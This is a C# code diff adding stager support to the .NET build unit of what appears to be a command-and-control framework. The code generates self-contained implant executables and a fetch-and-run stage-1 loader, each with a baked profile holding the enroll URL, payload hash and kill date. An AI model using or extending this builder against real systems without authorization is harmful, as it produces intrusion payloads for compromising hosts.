@@ -30,6 +30,11 @@ public sealed class DotNetBuildUnit : IBuildUnit
     // fixture or skip a real build. The default walks up from the assembly to find
     // the repo root and lands at <root>/src/implant/dotnet (the tree added with ).
     private readonly string _implantSourceDir;
+
+    // The stage-1 stager tree this unit compiles for stager-class builds
+    // (architecture.md Sec 6): <repo>/src/stager/dotnet, the minimal
+    // fetch-and-run loader. Same override story as the implant tree.
+    private readonly string _stagerSourceDir;
     private readonly string _dotnetBinary;
 
     public Language Language => Language.DotNet;
@@ -37,20 +42,35 @@ public sealed class DotNetBuildUnit : IBuildUnit
     /// <summary>
     /// Builds a .NET build unit. <paramref name="implantSourceDir"/> is the implant
     /// tree to compile (the one containing the .csproj and Program.cs); defaults
-    /// to <c>&lt;repo&gt;/src/implant/dotnet</c>. <paramref name="dotnetBinary"/> is the
+    /// to <c>&lt;repo&gt;/src/implant/dotnet</c>. <paramref name="stagerSourceDir"/> is
+    /// the stage-1 loader tree stager-class builds compile; defaults to
+    /// <c>&lt;repo&gt;/src/stager/dotnet</c>. <paramref name="dotnetBinary"/> is the
     /// dotnet executable, defaulting to PATH resolution of <c>dotnet</c>.
     /// </summary>
-    public DotNetBuildUnit(string? implantSourceDir = null, string? dotnetBinary = null)
+    public DotNetBuildUnit(
+        string? implantSourceDir = null,
+        string? stagerSourceDir = null,
+        string? dotnetBinary = null)
     {
         _implantSourceDir = implantSourceDir ?? ResolveDefaultImplantSourceDir();
+        _stagerSourceDir = stagerSourceDir ?? ResolveDefaultStagerSourceDir();
         _dotnetBinary = dotnetBinary ?? "dotnet";
     }
 
     public async Task<BuildArtifact> BuildAsync(BuildParams @params, CancellationToken cancellationToken = default)
     {
-        if (!Directory.Exists(_implantSourceDir))
+        // The output class picks the tree (architecture.md Sec 6): every class
+        // but the stager compiles the reference implant; the stager compiles
+        // the stage-1 loader with its own, much smaller baked profile.
+        var isStager = @params.Class == ImplantClass.Stager;
+        var sourceDir = isStager ? _stagerSourceDir : _implantSourceDir;
+        var component = isStager ? "stager" : "implant";
+        if (!Directory.Exists(sourceDir))
             throw new InvalidOperationException(
-                $".NET implant source tree not found at '{_implantSourceDir}'.");
+                $".NET {component} source tree not found at '{sourceDir}'.");
+        if (isStager && @params.Stage2 is null)
+            throw new InvalidOperationException(
+                "A stager build requires a stage-2 payload reference (BuildParams.Stage2).");
 
         // The artifact must run on the target, not on the build host: map the
         // requested OS/arch onto a runtime identifier and publish self-contained
@@ -61,40 +81,44 @@ public sealed class DotNetBuildUnit : IBuildUnit
         var rid = MapRid(@params.Target);
 
         var now = DateTimeOffset.UtcNow;
-        var baked = RenderBakedProfile(@params);
+        var baked = isStager ? RenderStagerProfile(@params) : RenderBakedProfile(@params);
 
-        // A unique temp work dir per build that mirrors the implant's relative
-        // layout in the repo: <work>/src/implant/dotnet references <work>/src/
-        // teamserver/Rod.Protocol/protos/rod.proto via a relative path, and
-        // resolves CPM and the shared build props from <work>. Copying that
-        // structure keeps the build hermetic -- the real source tree is never
-        // mutated and two concurrent builds never step on each other (also why
-        // the Go build unit partitions GOCACHE).
+        // A unique temp work dir per build that mirrors the component's relative
+        // layout in the repo: <work>/src/<component>/<name> resolves CPM and the
+        // shared build props from <work>, and the implant additionally references
+        // <work>/src/teamserver/Rod.Protocol/protos/rod.proto via a relative
+        // path. Copying that structure keeps the build hermetic -- the real
+        // source tree is never mutated and two concurrent builds never step on
+        // each other.
         var workDir = Path.Combine(Path.GetTempPath(), "rod-dotnet-build-" + Guid.NewGuid().ToString("N"));
-        var stagingDir = Path.Combine(workDir, "src", "implant", "dotnet");
+        var stagingDir = Path.Combine(workDir, "src", isStager ? "stager" : "implant", "dotnet");
         var outputDir = Path.Combine(workDir, "out");
         try
         {
-            CopyTree(_implantSourceDir, stagingDir);
+            CopyTree(sourceDir, stagingDir);
 
-            // Reproduce the relative layout the csproj assumes: the proto is at
-            // <work>/src/teamserver/Rod.Protocol/protos/rod.proto (referenced as
-            // ../../teamserver/... from the implant dir), and CPM + shared props
-            // sit at <work>/.
-            CopyProtoTree(_implantSourceDir, workDir);
-            CopyRepoProps(_implantSourceDir, workDir);
+            // Reproduce the relative layout the csproj assumes: the implant's
+            // proto is at <work>/src/teamserver/Rod.Protocol/protos/rod.proto
+            // (referenced as ../../teamserver/... from the implant dir); CPM and
+            // the shared props sit at <work>/ for both trees. The stager
+            // references nothing outside its own tree.
+            if (!isStager)
+                CopyProtoTree(sourceDir, workDir);
+            CopyRepoProps(sourceDir, workDir);
 
             // Overwrite the checked-in BakedProfile stub with the per-build profile.
-            // The committed stub compiles empty so the implant runs from flags/env
+            // The committed stub compiles empty so the component runs from flags/env
             // during development; the build unit replaces it with the real profile
             // here, in the copy, leaving the source of truth untouched.
             var bakedPath = Path.Combine(stagingDir, "BakedProfile.cs");
-            await File.WriteAllTextAsync(bakedPath, RenderBakedSource(baked), cancellationToken);
+            await File.WriteAllTextAsync(
+                bakedPath,
+                RenderBakedSource(baked, isStager ? "Rod.Stager" : "Rod.Implant"),
+                cancellationToken);
 
-            // dotnet publish compiles the implant (including its proto client
-            // bindings) into a self-contained single-file executable for the
-            // requested runtime identifier: one native entrypoint, runtime
-            // bundled, no target-side install.
+            // dotnet publish compiles the component into a self-contained
+            // single-file executable for the requested runtime identifier: one
+            // native entrypoint, runtime bundled, no target-side install.
             var result = await RunDotNetAsync(
                 new[]
                 {
@@ -123,11 +147,13 @@ public sealed class DotNetBuildUnit : IBuildUnit
                     $"dotnet publish failed (exit {result.ExitCode}):\n{diag}");
             }
 
-            // The single-file executable is the artifact: the compiled implant
+            // The single-file executable is the artifact: the compiled component
             // with the runtime bundled, ready to drop on the target and run. A
             // Windows target gets an .exe; everything else gets the extensionless
             // native binary.
-            var exeName = rid.StartsWith("win", StringComparison.Ordinal) ? "Rod.Implant.exe" : "Rod.Implant";
+            var exeName = rid.StartsWith("win", StringComparison.Ordinal)
+                ? (isStager ? "Rod.Stager.exe" : "Rod.Implant.exe")
+                : (isStager ? "Rod.Stager" : "Rod.Implant");
             var exePath = Path.Combine(outputDir, exeName);
             if (!File.Exists(exePath))
                 throw new InvalidOperationException(
@@ -231,17 +257,44 @@ public sealed class DotNetBuildUnit : IBuildUnit
         return ordered;
     }
 
+    // Renders the stage-1 stager's baked profile (architecture.md Sec 6): the
+    // loader consumes a much smaller key set than the implant -- the enroll
+    // listener it fetches its stage-2 from, the payload id and its sha256 (the
+    // fetch's integrity anchor, the same fingerprint the operator saw at build
+    // time), and the kill date the loader refuses to run past. Same base64url
+    // JSON shape as the implant's profile, so every build unit emits one
+    // encoding and a loader of any language decodes the same way.
+    public static string RenderStagerProfile(BuildParams @params)
+    {
+        if (@params.Class != ImplantClass.Stager)
+            throw new InvalidOperationException("A stager profile is only rendered for the stager class.");
+        if (@params.Stage2 is null)
+            throw new InvalidOperationException("A stager build requires a stage-2 payload reference.");
+
+        var map = new Dictionary<string, object>
+        {
+            ["enrollURL"] = @params.Transport.Endpoint,
+            ["stage2PayloadId"] = @params.Stage2.PayloadId.ToString(),
+            ["stage2Sha256"] = @params.Stage2.Sha256,
+            ["killDate"] = @params.Beacon.KillDate.ToString("O"),
+        };
+        var json = JsonSerializer.Serialize(map);
+        return Base64UrlCodec.Encode(Encoding.UTF8.GetBytes(json));
+    }
+
     // Materializes the generated BakedProfile.cs source from a baked profile. The
     // file replaces the checked-in stub in the per-build copy of the source tree;
-    // the implant's Program reads BakedProfile.Json and decodes the base64url JSON.
-    private static string RenderBakedSource(string base64UrlProfile)
+    // the component's Program reads BakedProfile.Json and decodes the base64url
+    // JSON. The namespace differs per tree (Rod.Implant, Rod.Stager), so it is a
+    // parameter.
+    private static string RenderBakedSource(string base64UrlProfile, string bakedNamespace)
     {
         // The profile is embedded as a verbatim C# string literal. base64url
         // (A-Za-z0-9-_) contains no characters that need escaping in a verbatim
         // string, so the literal is exactly the encoded value.
         return "// <auto-generated> Generated by Rod.DotNetBuildUnit at build time.\n"
-            + "// The per-implant profile, baked in at generation (architecture.md Sec 5.1).\n"
-            + "namespace Rod.Implant;\n\n"
+            + "// The per-artifact profile, baked in at generation (architecture.md Sec 5.1).\n"
+            + "namespace " + bakedNamespace + ";\n\n"
             + "internal static class BakedProfile\n"
             + "{\n"
             + "    public const string Json = \"" + base64UrlProfile + "\";\n"
@@ -406,6 +459,21 @@ public sealed class DotNetBuildUnit : IBuildUnit
         }
         // Fall back to a relative path so the error message in BuildAsync is clear.
         return Path.Combine("..", "..", "..", "..", "..", "src", "implant", "dotnet");
+    }
+
+    // The stager twin of the implant resolver: <repo>/src/stager/dotnet under
+    // the same repo root.
+    private static string ResolveDefaultStagerSourceDir()
+    {
+        var dir = new DirectoryInfo(AppContext.BaseDirectory);
+        while (dir is not null)
+        {
+            if (Directory.Exists(Path.Combine(dir.FullName, "src", "stager", "dotnet"))
+                && Directory.Exists(Path.Combine(dir.FullName, "src", "teamserver")))
+                return Path.Combine(dir.FullName, "src", "stager", "dotnet");
+            dir = dir.Parent;
+        }
+        return Path.Combine("..", "..", "..", "..", "..", "src", "stager", "dotnet");
     }
 
     private static void TryCleanup(string path)
